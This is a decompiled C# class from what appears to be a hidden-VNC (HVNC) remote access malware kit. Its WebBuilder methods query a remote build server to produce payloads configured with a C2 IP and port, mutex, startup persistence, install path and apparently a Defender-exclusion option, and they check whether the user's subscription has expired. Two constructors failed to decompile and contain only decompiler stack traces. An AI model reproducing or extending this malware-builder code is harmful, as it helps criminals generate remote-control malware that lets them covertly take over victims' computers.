using System;
using System.IO;
using System.Net;

namespace HVNC.WebBuilder
{
	// Token: 0x0200001E RID: 30
	internal class WebBuilder
	{
		// Token: 0x06000110 RID: 272 RVA: 0x00017A24 File Offset: 0x00015C24
		public static string SendBuild(string ip, string port, string id, string mutex, string startup, string path, string folder, string filename, string wdex, string hhvnc)
		{
			string result;
			try
			{
				WebRequest webRequest = WebRequest.Create(string.Concat(new string[]
				{
					WebBuilder.Server,
					"?user=",
					WebBuilder.Username,
					"&action=build&ip=",
					ip,
					"&port=",
					port,
					"&id=",
					id,
					"&mutex=",
					mutex,
					"&startup=",
					startup,
					"&path=",
					path,
					"&folder=",
					folder,
					"&filename=",
					filename,
					"&wdex=",
					wdex,
					"&hhvnc=",
					hhvnc
				}));
				webRequest.Method = "GET";
				string text = new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
				if (text.Contains("Build Completed"))
				{
					result = "success";
				}
				else if (text.Contains("Invalid Arguments"))
				{
					result = "invalid-arguments";
				}
				else if (text.Contains("missing-args"))
				{
					result = "missing-args";
				}
				else if (text.Contains("User Not-Found OR Expired!"))
				{
					result = "invalid-user-or-expired";
				}
				else
				{
					result = "false";
				}
			}
			catch (WebException)
			{
				result = "error";
			}
			return result;
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00017B88 File Offset: 0x00015D88
		public static string DeleteOldBuild()
		{
			string result;
			try
			{
				WebRequest webRequest = WebRequest.Create(WebBuilder.Server + "?user=" + WebBuilder.Username + "&action=delete");
				webRequest.Method = "GET";
				if (new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd().Contains("deleted"))
				{
					result = "success";
				}
				else
				{
					result = "false";
				}
			}
			catch (WebException)
			{
				result = "error";
			}
			return result;
		}

		// Token: 0x06000112 RID: 274 RVA: 0x00017C08 File Offset: 0x00015E08
		public static string IsBuilderAlive()
		{
			string result;
			try
			{
				WebRequest webRequest = WebRequest.Create(WebBuilder.Server + "?user=" + WebBuilder.Username + "&action=alive");
				webRequest.Method = "GET";
				if (new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd().Contains("alive"))
				{
					result = "alive";
				}
				else
				{
					result = "false";
				}
			}
			catch (WebException)
			{
				result = "error";
			}
			return result;
		}

		// Token: 0x06000113 RID: 275 RVA: 0x00004634 File Offset: 0x00002834
		public WebBuilder()
		{
			/*
An exception occurred when decompiling this method (06000113)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.WebBuilder.WebBuilder::.ctor()

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00017C88 File Offset: 0x00015E88
		// Note: this type is marked as 'beforefieldinit'.
		static WebBuilder()
		{
			/*
An exception occurred when decompiling this method (06000114)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.WebBuilder.WebBuilder::.cctor()

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x04000130 RID: 304
		public static string Server;

		// Token: 0x04000131 RID: 305
		public static string Username;

		// Token: 0x04000132 RID: 306
		public static string DownloadURL;
	}
}
